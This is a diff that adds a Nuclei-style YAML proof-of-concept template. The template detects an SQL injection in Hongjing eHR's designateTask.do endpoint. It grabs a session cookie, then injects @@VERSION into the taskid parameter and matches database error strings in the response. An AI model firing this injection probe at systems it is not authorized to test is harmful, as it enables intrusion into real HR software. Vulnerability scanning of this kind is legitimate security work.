@@ -1,0 +1,41 @@
+id: poc-yaml-hongjing-ehr-designatetask-sqli
+info:
+  name: 宏景eHR designateTask.do SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  reference: []
+
+variables:
+  jsessionid: ''
+
+http:
+  - raw:
+      - |
+        GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
+        Host: {{Host}}
+
+    extractors:
+      - type: regex
+        name: jsessionid
+        part: header
+        regex:
+          - "JSESSIONID=([^;]+);"
+        internal: true
+
+  - raw:
+      - |
+        GET /performance/objectiveManage/designateTask.do?b_save=&taskid=@@VERSION HTTP/1.1
+        Host: {{Host}}
+        Cookie: JSESSIONID={{jsessionid}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "转换成数据类型"
+          - "在将"
+      - type: regex
+        regex:
+          - "SQL Server"
+          - "MySQL"
